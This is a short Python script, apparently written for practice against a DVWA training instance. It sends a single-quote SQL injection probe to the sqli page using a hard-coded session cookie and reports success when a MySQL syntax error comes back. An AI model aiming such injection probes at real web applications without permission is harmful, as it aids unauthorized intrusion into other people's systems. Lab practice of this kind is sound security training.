import requests

headers = {'Cookie' : 'security=low; PHPSESSID=2iobm0910u0jdkmfgvbk98pbl3'}

base_url = "http://180.232.87.123/DVWA/vulnerabilities/sqli/?id="
tail_url = "&Submit=Submit#"

payloads = ["'"]

for payload in payloads:
  response = requests.get(base_url + payload + tail_url, headers = headers)
  
  if "You have an error in your SQL syntax" in response.text:
    print("Injection Working! --> [OK] - Payload: %s" % payload)